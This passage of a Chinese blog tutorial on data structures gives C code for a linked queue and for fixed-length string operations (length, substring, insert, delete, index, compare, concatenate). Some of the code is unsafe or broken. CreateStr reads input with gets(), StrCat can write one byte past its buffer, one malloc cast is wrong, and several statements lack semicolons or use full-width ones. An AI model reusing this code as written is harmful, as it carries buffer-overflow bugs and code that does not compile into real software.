class="language-c">LinkQueue<span class="token operator">*</span> <span class="token function">InitQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//队列初始化</span><span class="token punctuation">{</span>    LinkQueue<span class="token operator">*</span> Q<span class="token punctuation">;</span>    LinkListQ<span class="token operator">*</span> p<span class="token punctuation">;</span>    Q <span class="token operator">=</span> <span class="token punctuation">(</span>LinkQueue<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>LinkQueue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//头指针所指节点</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span>LinkListQ<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>LinkListQ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//头节点</span>    Q<span class="token operator">-></span>front <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Q指针所指的front指针指向p</span>    Q<span class="token operator">-></span>rear <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Q指针所指的rear指针指向p</span>    <span class="token keyword">return</span> Q<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="入队-1"><a href="#入队-1" class="headerlink" title="入队"></a>入队</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">EnQueue</span><span class="token punctuation">(</span>LinkQueue<span class="token operator">*</span> Q<span class="token punctuation">,</span> DataType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//插入e于队尾</span><span class="token punctuation">{</span>    LinkListQ<span class="token operator">*</span> s<span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token punctuation">(</span>LinkListQ<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>LinkListQ<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//分配内存空间</span>    s<span class="token operator">-></span>data <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将e存入新节点的数据域</span>    s<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    Q<span class="token operator">-></span>rear<span class="token operator">-></span>next <span class="token operator">=</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将新节点插入链队之后</span>    Q<span class="token operator">-></span>rear <span class="token operator">=</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//队尾指针指向队尾元素</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出队-1"><a href="#出队-1" class="headerlink" title="出队"></a>出队</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">DeQueue</span><span class="token punctuation">(</span>LinkQueue<span class="token operator">*</span> Q<span class="token punctuation">,</span> DataType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除队头，用e返回其值</span><span class="token punctuation">{</span>    LinkListQ<span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Q<span class="token operator">-></span>front <span class="token operator">==</span> Q<span class="token operator">-></span>rear<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//队空</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    p <span class="token operator">=</span> Q<span class="token operator">-></span>front<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p指向队头元素</span>    <span class="token operator">*</span>e <span class="token operator">=</span> p<span class="token operator">-></span>data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//队头元素的值赋给e</span>    Q<span class="token operator">-></span>front<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//原队头节点后继p->next赋给头节点后继</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Q<span class="token operator">-></span>rear <span class="token operator">==</span> p<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*p->next==NULL*/</span> <span class="token comment" spellcheck="true">//队头等于队尾，删除后将rear指向头节点</span>    <span class="token punctuation">{</span>        Q<span class="token operator">-></span>rear <span class="token operator">=</span> Q<span class="token operator">-></span>front<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此时队空</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>对于循环队列和链队列的比较，可以从两方面，从时间上看，它们基本操作都是常数时间，都为O(1)，从空间看，</p><p>循环队列必须有一个固定的长度，就有了存储元素个数和空间资源浪费的问题，而链队列不存在这个问题；尽管需</p><p>要一个指针域，需要空间，但是可以接受，所以空间上链队列更加灵活；</p><p>总的来说，在可以确定队列长度最大值的情况下，建议使用循环队列，无法估计队列长度时则用链队列；</p><p>下面要学习线性结构的最后一种 — 串； Waiting for me！Bye~</p><h1 id="串—String"><a href="#串—String" class="headerlink" title="串—String"></a>串—String</h1><p>字符串，大家都不陌生对吧，学习C语言的时候就讲过了，编程题中常常遇到，这里所学习的串和字符串的用法基本一致，无非就是改改名称，优化算法，hhhh；</p><h2 id="定义-7"><a href="#定义-7" class="headerlink" title="定义"></a>定义</h2><p>串是由零个或多个字符组成的有限序列，又名叫字符串；</p><p>串中的字符数目n称为串的长度；</p><p>零个字符的串称为空串，可以用两双引号””表示，也可以用希腊字母Ø表示；</p><h2 id="串的抽象数据类型"><a href="#串的抽象数据类型" class="headerlink" title="串的抽象数据类型"></a>串的抽象数据类型</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>、<span class="token function">StrAssign</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token operator">*</span>chars<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//生成一个值等于chars的串S</span><span class="token number">2</span>、<span class="token function">StrCopy</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串T复制得串S</span><span class="token number">3</span>、<span class="token function">StrLength</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串S的长度，即S中的元素个数</span><span class="token number">4</span>、<span class="token function">StrCat</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串T连接在串S后面</span><span class="token number">5</span>、<span class="token function">SubString</span><span class="token punctuation">(</span>Sub<span class="token punctuation">,</span>S<span class="token punctuation">,</span>pos<span class="token punctuation">,</span>len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//用Sub返回串S的第pos个字符起长度为len的子串</span><span class="token number">6</span>、<span class="token function">StrIndex</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置，否则返回代表错误的值</span><span class="token number">7</span>、<span class="token function">StrInsert</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>pos<span class="token punctuation">,</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在串S的第pos个字符插入串T</span><span class="token number">8</span>、<span class="token function">StrDelete</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>pos<span class="token punctuation">,</span>len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//从串S中删除第pos个字符起长度为len的子串</span><span class="token number">9</span>、<span class="token function">StrReplace</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>T<span class="token punctuation">,</span>V<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//用串V替换串S中出现得到所有与T相等的不重叠子串</span><span class="token number">10</span>、<span class="token function">StrEmpty</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若串S为空串，则返回1，否则返回0</span><span class="token number">11</span>、<span class="token function">StrCompare</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//若S>T，则返回值>0,若S=T，则返回值=0,若S&lt;T，则返回值&lt;0</span><span class="token number">12</span>、<span class="token function">StrClear</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将串S清空</span><span class="token number">13</span>、<span class="token function">DispStr</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//显示串S的所有字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><p>串的存储结构也是分为顺序存储结构和链式存储结构，重点讲顺序存储结构，即定长顺序串；</p><h3 id="结构代码-2"><a href="#结构代码-2" class="headerlink" title="结构代码"></a>结构代码</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> Len<span class="token punctuation">;</span><span class="token punctuation">}</span>String<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrLength</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//求字符串S长度</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    S<span class="token operator">-></span>Len <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>Len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="建立新串"><a href="#建立新串" class="headerlink" title="建立新串"></a>建立新串</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">CreateStr</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//建立一个新串</span><span class="token punctuation">{</span>    <span class="token function">gets</span><span class="token punctuation">(</span>S<span class="token operator">-></span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>    S<span class="token operator">-></span>Len <span class="token operator">=</span> <span class="token function">StrLength</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="求子串函数"><a href="#求子串函数" class="headerlink" title="求子串函数"></a>求子串函数</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">SubString</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">,</span> String<span class="token operator">*</span> Sub<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//求子串函数，用Sub返回串S的第pos个字符起长度为len的子串</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> pos<span class="token operator">></span>S<span class="token operator">-></span>Len <span class="token operator">||</span> len<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> len<span class="token operator">></span>S<span class="token operator">-></span>Len <span class="token operator">-</span> pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//范围错误</span>    <span class="token punctuation">{</span>        Sub<span class="token operator">-></span>Len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ERROR\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Sub<span class="token operator">-></span>ch<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token operator">-></span>ch<span class="token punctuation">[</span>pos <span class="token operator">+</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新串Sub赋值</span>        <span class="token punctuation">}</span>        Sub<span class="token operator">-></span>ch<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新串尾部加上字符串结束标志</span>        Sub<span class="token operator">-></span>Len <span class="token operator">=</span> len<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//规定长度</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="删除子串"><a href="#删除子串" class="headerlink" title="删除子串"></a>删除子串</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrDelete</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除子串，在S中删除第i开始连续l个字符</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> S<span class="token operator">-></span>Len<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"子串超界"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> i <span class="token operator">+</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> S<span class="token operator">-></span>Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//从第i位开始删除长度为l个字符</span>        <span class="token punctuation">{</span>            S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token operator">-></span>ch<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        S<span class="token operator">-></span>Len <span class="token operator">=</span> S<span class="token operator">-></span>Len <span class="token operator">-</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//长度-l</span>        S<span class="token operator">-></span>ch<span class="token punctuation">[</span>S<span class="token operator">-></span>Len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新串尾部加上字符串结束标志</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插入子串"><a href="#插入子串" class="headerlink" title="插入子串"></a>插入子串</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrInsert</span><span class="token punctuation">(</span>String <span class="token operator">*</span>S<span class="token punctuation">,</span>String <span class="token operator">*</span>T<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串S中第i个字符插入子串T</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> S<span class="token operator">-></span>Len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"插入位置错误"</span><span class="token punctuation">)</span>；        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token operator">-></span>Len<span class="token operator">+</span>T<span class="token operator">-></span>Len<span class="token operator">></span>MAXSIZE<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"两串长度超过存储空间长度"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>；    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> S<span class="token operator">-></span>Len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将第i位开始的字符各向后移动T串长度</span>        <span class="token punctuation">{</span>            S<span class="token operator">-></span>ch<span class="token punctuation">[</span>T<span class="token operator">-></span>Len <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> S<span class="token operator">-></span>ch<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> T<span class="token operator">-></span>Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将子串T插入到串S的第i位处</span>        <span class="token punctuation">{</span>            S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token operator">-></span>ch<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        S<span class="token operator">-></span>Len <span class="token operator">=</span> S<span class="token operator">-></span>Len <span class="token operator">+</span> T<span class="token operator">-></span>Len<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//修改串S的长度</span>        S<span class="token operator">-></span>ch<span class="token punctuation">[</span>S<span class="token operator">-></span>Len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新串S尾部加上字符串结束标志</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="定位子串"><a href="#定位子串" class="headerlink" title="定位子串"></a>定位子串</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrIndex</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">,</span> String<span class="token operator">*</span> T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串的定位函数，若串S中存在与串T相同的子串，则返回它在串S中第一次出现的位置(第几个字符，不是下标)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> S<span class="token operator">-></span>Len <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> T<span class="token operator">-></span>Len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当两串指针没指向该串尾时进行比较</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> T<span class="token operator">-></span>ch<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            i <span class="token operator">=</span> i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> T<span class="token operator">-></span>Len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//串S中有串T</span>    <span class="token punctuation">{</span>        k <span class="token operator">=</span> i <span class="token operator">-</span> T<span class="token operator">-></span>Len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        k <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrCompare</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S1<span class="token punctuation">,</span> String<span class="token operator">*</span> S2<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断两个串是否相等</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>S1<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span> <span class="token operator">&amp;&amp;</span> S2<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当两串没到串尾部时</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>S1<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> S2<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//两串对应位置的字符是否相同</span>        <span class="token punctuation">{</span>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//标志置为1</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结束循环</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//计数</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> S1<span class="token operator">-></span>Len <span class="token operator">==</span> S2<span class="token operator">-></span>Len<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//两串长度相同且所有字符都相同，两串相等</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> S1<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> S2<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回对应第一个不相同位置字符ASCII码差值</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">StrCat</span><span class="token punctuation">(</span>String<span class="token operator">*</span> S<span class="token punctuation">,</span> String<span class="token operator">*</span> T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//连接函数</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> flag<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>S<span class="token operator">-></span>Len <span class="token operator">+</span> T<span class="token operator">-></span>Len <span class="token operator">&lt;=</span> MAXSIZE<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//连接后串长小于MAXSIZE</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> S<span class="token operator">-></span>Len<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token operator">-></span>Len <span class="token operator">+</span> T<span class="token operator">-></span>Len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token operator">-></span>ch<span class="token punctuation">[</span>i <span class="token operator">-</span> S<span class="token operator">-></span>Len<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//赋值连接</span>        <span class="token punctuation">}</span>        S<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>        S<span class="token operator">-></span>Len <span class="token operator">+</span><span class="token operator">=</span> T<span class="token operator">-></span>Len<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//长度相加</span>        flag <span class="token operator">=</span> <span class="token number">1</span><span class="token 